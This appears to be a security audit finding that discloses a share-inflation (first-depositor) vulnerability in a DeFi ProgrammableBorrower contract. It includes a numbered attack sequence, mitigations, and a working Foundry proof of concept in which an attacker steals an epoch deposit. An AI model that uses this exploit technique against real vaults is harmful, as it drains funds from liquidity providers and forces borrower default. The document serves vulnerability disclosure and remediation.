### Title
ProgrammableBorrower accepts zero shares for an inflated ERC4626 deposit, causing LP fund loss and borrower default - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle epoch funds into a configurable ERC4626 vault through `_depositToVault`, but it only records the emitted share amount and never enforces a minimum share amount or checks that the shares have nonzero asset value. If the vault is in the classic first-depositor/inflated-share state, an unprivileged vault user can front-run `startEpoch`, leave the vault with a tiny share supply and a large donated balance, and cause the borrower contract’s deposit to mint `0` shares. The attacker then redeems the vault’s shares and receives the deposited LP funds, while `ProgrammableBorrower` cannot provide the cash required by `stopEpoch`, forcing a borrower default and permanently impairing the tranches.

### Finding Description
`IdleCDOEpochVariant.startEpoch` sends borrower funds to the configured borrower and invokes `onStartEpoch`. [1](#0-0) 

For a programmable borrower, `onStartEpoch` deposits the borrower contract’s full token balance into the ERC4626 vault. [2](#0-1) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and accepts whatever amount of vault shares is returned. There is no `minShares` parameter, no nonzero-share check, and no comparison between assets deposited and assets represented by the returned shares. [3](#0-2) 

This is vulnerable when the target vault uses an asset/share exchange rate that can be manipulated by direct donations, particularly around the first deposit. The attacker can:

1. Deposit `1 wei` into an empty or effectively empty vault and receive `1` share.
2. Transfer a large asset amount directly to the vault, inflating `assets / totalSupply`.
3. Let `ProgrammableBorrower.onStartEpoch` deposit the epoch balance.
4. The vault rounds the borrower’s share mint down to `0`.
5. Redeem the attacker-held share and receive the donated assets plus the borrower deposit.
6. Leave `ProgrammableBorrower` with no economically meaningful vault position.

The protocol treats the ERC4626 vault as the source of programmable-borrower liquidity. At `stopEpoch`, `onStopEpoch` attempts to withdraw the requested shortfall from the vault. [4](#0-3) 

If the vault shares cannot cover the required amount, `onStopEpoch` returns success so the later `transferFrom` can fail and trigger the default path. [5](#0-4) 

`IdleCDOEpochVariant._stopEpoch` calls `getFundsFromBorrower`; when that transfer fails, `_handleBorrowerDefault` is invoked. [6](#0-5) [7](#0-6) 

`_handleBorrowerDefault` marks the pool defaulted, pauses the CDO, stops the epoch, and disables new withdrawal requests. [8](#0-7) 

### Impact Explanation
The attacker can steal the full asset amount deposited by `ProgrammableBorrower` into the vulnerable ERC4626 vault. For an epoch where `N` underlying tokens are sent to the borrower, the vault mints zero shares and the sole attacker share redeems approximately the entire inflated vault balance, including the `N` tokens deposited by the borrower.

The protocol then has CDO strategy tokens representing assets that were supposed to be held by the borrower facility, but the borrower has neither the underlying nor a valuable ERC4626 position. `stopEpoch` cannot source the required pending withdrawals, so the pool enters the hard-default path. Active tranche holders and pending receipt holders can recover only whatever is later provided through `finalizeDefault`; absent external recovery, the loss is the stolen deposit amount.

This breaks both solvency and fair minting: strategy tokens were minted 1:1 for assets whose custody was immediately lost, while the vault accounting later sees that `ProgrammableBorrower` holds no corresponding ERC4626 assets. `mintStrategyTokens` and ordinary `deposit` both mint strategy tokens without independently verifying that the borrower-side destination retained asset value. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The attacker only needs to be an unprivileged user of the configured ERC4626 vault, which is explicitly in scope. They do not need to control the owner, manager, guardian, borrower, fee receiver, or queue.

The exploit requires a vault whose ERC4626 exchange rate can be manipulated enough that the borrower deposit mints zero shares or shares worth substantially less than the deposited assets. This condition is most realistic at vault initialization or after near-complete withdrawal, when share supply is very small. The borrower does not control the vault deployment state and `ProgrammableBorrower` accepts any ERC4626 vault matching the underlying asset during initialization and vault updates. [11](#0-10) [12](#0-11) 

The likelihood is reduced for mature ERC4626 vaults with large supply, virtual offsets, or exchange-rate behavior that cannot be manipulated by direct transfers. It remains high for a newly configured vault or a vault that permits the standard share-price inflation sequence because no minimum-share or slippage guard stops the deposit.

### Recommendation
Require economic success for every vault deposit:

- Add a `minSharesOut` or `minAssetsOut` bound to `ProgrammableBorrower`’s vault-deposit path and revert when `shares == 0` or `convertToAssets(shares)` is below the deposited amount minus bounded rounding loss.
- Prefer `IERC4626.deposit` followed by an explicit check such as `vault.convertToAssets(shares) >= assets - maxRoundingLoss`.
- Avoid depositing into an ERC4626 vault when its total share supply is zero and the implementation is susceptible to donation-based share inflation.
- Consider seeding/initializing approved vaults through a guarded owner flow before allowing epoch funds to enter them.
- If arbitrary ERC4626 vaults remain supported, use a safe ERC4626 wrapper that validates returned shares and bounds inflation losses.

The same validation should apply to repayments redeployed into the vault through `_depositToVault`, since the same unchecked call is used there. [13](#0-12) 

### Proof of Concept
The following Foundry PoC uses a minimal exchange-rate ERC4626 vault solely to reproduce the economically valid first-depositor inflation behavior against the production `ProgrammableBorrower` accounting path. In a fork PoC, replace `InflatableVault` with the configured production vault and recreate its inflated exchange-rate state.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

import "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract PoCToken is ERC20 {
    constructor() ERC20("Underlying", "UND") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract InflatableVault is ERC4626 {
    constructor(IERC20 asset_) ERC4626(asset_) ERC20("Vault Share", "vUND") {}
}

contract MockCDO {
    PoCToken public immutable asset;
    ProgrammableBorrower public borrower;

    constructor(PoCToken asset_) {
        asset = asset_;
    }

    function setBorrower(ProgrammableBorrower borrower_) external {
        borrower = borrower_;
    }

    function startEpoch(uint256 pendingWithdraws) external {
        asset.transfer(address(borrower), asset.balanceOf(address(this)));
        borrower.onStartEpoch(pendingWithdraws);
    }
}

contract ProgrammableBorrowerInflationPoC is Test {
    PoCToken internal asset;
    InflatableVault internal vault;
    ProgrammableBorrower internal borrower;
    MockCDO internal cdo;

    address internal attacker = address(0xA77ACC);
    uint256 internal constant EPOCH_DEPOSIT = 1_000_000e18;
    uint256 internal constant INFLATION_DONATION = 1_000_000e18;

    function setUp() public {
        asset = new PoCToken();
        vault = new InflatableVault(IERC20(address(asset)));
        cdo = new MockCDO(asset);
        borrower = new ProgrammableBorrower();

        borrower.initialize(
            address(vault),
            address(cdo),
            address(this),       // owner
            address(this),       // manager
            address(0xB0AA0),    // real borrower
            0
        );

        asset.mint(attacker, INFLATION_DONATION + 1 wei);
        asset.mint(address(cdo), EPOCH_DEPOSIT);
    }

    function testInflatedVaultStealsEpochDeposit() public {
        // Attacker creates the first share and inflates its price by donation.
        vm.startPrank(attacker);
        asset.approve(address(vault), 1 wei);
        vault.deposit(1 wei, attacker);
        asset.transfer(address(vault), INFLATION_DONATION);
        vm.stopPrank();

        // One share now costs more than the borrower deposit, so the deposit mints zero shares.
        uint256 expectedShares = vault.previewDeposit(EPOCH_DEPOSIT);
        assertEq(expectedShares, 0);

        cdo.startEpoch(0);

        assertEq(asset.balanceOf(address(borrower)), 0);
        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(vault.convertToAssets(vault.balanceOf(address(borrower))), 0);

        // The attacker redeems the only share and takes the borrower's deposit too.
        uint256 attackerBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(
            asset.balanceOf(attacker) - attackerBefore,
            EPOCH_DEPOSIT + INFLATION_DONATION + 1 wei
        );
        assertEq(asset.balanceOf(address(vault)), 0);
    }
}
```

At the next `stopEpoch`, `availableToBorrow` and `_currentVaultAssets` reflect zero economically usable vault assets, `onStopEpoch` cannot withdraw the needed amount, and the CDO’s `getFundsFromBorrower` fails into `_handleBorrowerDefault`. The demonstrated attacker profit is `EPOCH_DEPOSIT`; the donation is returned to the attacker and therefore is not a net cost.
